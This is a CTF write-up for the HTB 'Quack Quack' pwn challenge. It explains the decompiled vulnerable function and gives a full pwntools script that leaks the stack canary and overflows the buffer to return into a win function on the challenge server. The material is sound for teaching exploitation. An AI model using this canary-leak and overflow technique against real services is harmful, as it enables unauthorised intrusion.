---
title: Quack Quack
type: writeup
date: 2025-03-29T18:19:13+02:00
description: Writeup for Quack Quack [HTB Cyber Apocalypse CTF 2025]
author: sunbather
tags:
- pwn
draft: false
---
___

## Challenge Description

On the quest to reclaim the Dragon's Heart, the wicked Lord Malakar has cursed the villagers, turning them into ducks! Join Sir Alaric in finding a way to defeat them without causing harm. Quack Quack, it's time to face the Duck!

## Intuition

We can open the binary in Ghidra and see that the `main()` function calls an interesting `duckling()` function. Here is the latter's decompiled code, comments added by me:

```c
void duckling(void)
{
  long lVar1;
  char *pcVar2;
  long in_FS_OFFSET;
  char buf [102];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);

// [...]

  printf("Quack the Duck!\n\n> ");
  fflush(stdout);
  read(0,buf,0x66);
  pcVar2 = strstr(buf,"Quack Quack "); // <--- find "Quack Quack " in user input
  if (pcVar2 == (char *)0x0) {
    error("Where are your Quack Manners?!\n");
                    /* WARNING: Subroutine does not return */
    exit(0x520);
  }
  printf("Quack Quack %s, ready to fight the Duck?\n\n> ",pcVar2 + 0x20); // <--- print content after "Quack Quack ". Which can be used to leak
  read(0,buf + 0x20,0x6a);  // <--- start reading user input to buf+0x20 (overflow)
  puts("Did you really expect to win a fight against a Duck?!\n");
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

The program does the following:

1. Reads 0x66 bytes from the user.
2. Copies it to `buf`.
3. Searches for `Quack Quack ` in it and returns in it `pcVar2`.
4. Prints content from `pcVar2+0x20`.
5. Reads 0x6a bytes into `buf+0x20`.

Because `Quack Quack ` can be found at the end of the buffer, the `printf()` call at step 4 can be used to leak the stack content, including the cookie.

Then we can use the overflow at step 5 to overwrite the return address and return to a *win* function that is provided in the binary:

```c
void duck_attack(void)
{
  ssize_t sVar1;
  long in_FS_OFFSET;
  char local_15;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_14 = open("./flag.txt",0);
  if (local_14 < 0) {
    perror("\nError opening flag.txt, please contact an Administrator\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  while( true ) {
    sVar1 = read(local_14,&local_15,1);
    if (sVar1 < 1) break;
    fputc((int)local_15,stdout);
  }
  close(local_14);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

## Solution

Below is a Python script that leaks the canary and overflows the buffer to return to `duck_attack()`.

```py
#!/usr/bin/env python3

from pwn import *

#target = process("./quack_quack")
target = remote("83.136.253.25", 52011)

win = 0x0040137f

msg = b"Quack Quack "
payload = b"a" * (101 - len(msg)) + msg # put "Quack Quack " at the end to leak stack contents
target.send(payload)
target.recvuntil(b"Quack Quack ")
target.recvlines(5)
line_leak = target.recvline()
print(line_leak)
leak = b"\x00" + line_leak.split()[3][:-1] # get cookie leak and rbp

print(leak, len(leak))

payload = b"a" * 88 + leak + p64(win)[:2] + p64(win)[:2] # this is super weird because my leak included the rbp, too lazy to change it
target.send(payload)

target.interactive()

```

### Flag

`HTB{~c4n4ry_g035_qu4ck_qu4ck~_SOME_UNIQUE_ID}`

